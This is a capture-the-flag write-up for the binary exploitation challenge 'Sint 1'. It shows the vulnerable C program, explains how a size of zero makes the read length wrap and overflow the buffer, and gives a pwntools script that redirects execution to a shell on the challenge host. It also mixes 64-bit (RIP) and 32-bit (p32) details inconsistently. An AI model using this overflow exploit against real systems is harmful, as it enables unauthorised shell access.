# Write-up of the challenge "Sint 1"

This challenge is part of the "Binary exploitation" category and is in **Level 1**.

# Goal of the challenge

The objective of this challenge is to overwrite the **RIP** and make it point to **get_shell**.

## Program structure

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}

```

## Security breach

The vulnerability here is **integer overflow/underflow**:

```
read(0, buf, size - 1);
```

## Solution

The solution here is clear it checks if there is **buffer overflow** in this statement:

```
if (size > 256 || size < 0)
{
    printf("Buffer Overflow!\n");
    exit(0);
}
```

However it does not check if the size is zero. If we put zero as our size, later this will happen:

```
read(0, buf, 0 - 1);
```

which leads to **size: - 1** which is the **UINT_MAX**. That means we will have **a lot of storage** to **buffer overflow**. Then I found the address of the get_shell using **pwndbg** and it was **0x08048659**. Now the next step is to find the **RIP**, so I decompiled the binary in **dogbolt** and found that the buffer size is **char v0; // [bp-0x108]** and that means the **RIP is at 0x108 + 8**.

solve.py

```
from pwn import *

# p = process('./sint')

p = remote('host8.dreamhack.games', 9533)

get_shell = 0x08048659


offset = 264 + 8

# char v0;  // [bp-0x108]


payload_1 = b'0'

p.sendlineafter(b'Size: ', payload_1)

payload_2 = b'A' * offset + p32(get_shell)

p.sendlineafter(b'Data: ', payload_2)

p.interactive()

# 32 bit
```
